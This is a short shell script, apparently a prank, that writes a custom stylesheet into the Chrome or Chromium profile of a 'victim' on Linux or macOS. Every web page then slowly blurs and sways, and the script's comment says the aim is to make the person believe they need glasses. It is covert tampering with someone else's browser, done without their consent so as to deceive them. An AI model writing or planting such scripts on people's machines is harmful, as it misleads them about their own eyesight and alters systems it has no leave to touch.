#!/bin/sh
#
# Adds a very slight blur to the page to make the victim think they need glasses
#

# Setup environment

set -e
CUSTOM_CSS_PATH=""

# Determine OS

unamestr=`uname -s`
if [ "$(uname -s)" = "Linux" ]; then
   CUSTOM_CSS_PATH="$HOME/.config/chromium/Default/User StyleSheets"
elif [ "$(uname -s)" = "Darwin" ]; then
   CUSTOM_CSS_PATH="$HOME/Library/Application Support/Google/Chrome/Default/User StyleSheets"
else
	exit 1
fi

#Do it!
mkdir -p "$CUSTOM_CSS_PATH"
touch "$CUSTOM_CSS_PATH/Custom.css"
echo 'body{-webkit-animation:blur 30s ease-in-out alternate infinite}body{-webkit-animation:sway 300s ease-in-out alternate infinite}@-webkit-keyframes blur{0%{-webkit-filter:blur(0px)}100%{-webkit-filter:blur(1px)}}@-webkit-keyframes sway{0%{-webkit-transform:rotate(-0.1deg)}100%{-webkit-transform:rotate(0.1deg)}}' >> "$CUSTOM_CSS_PATH/Custom.css"
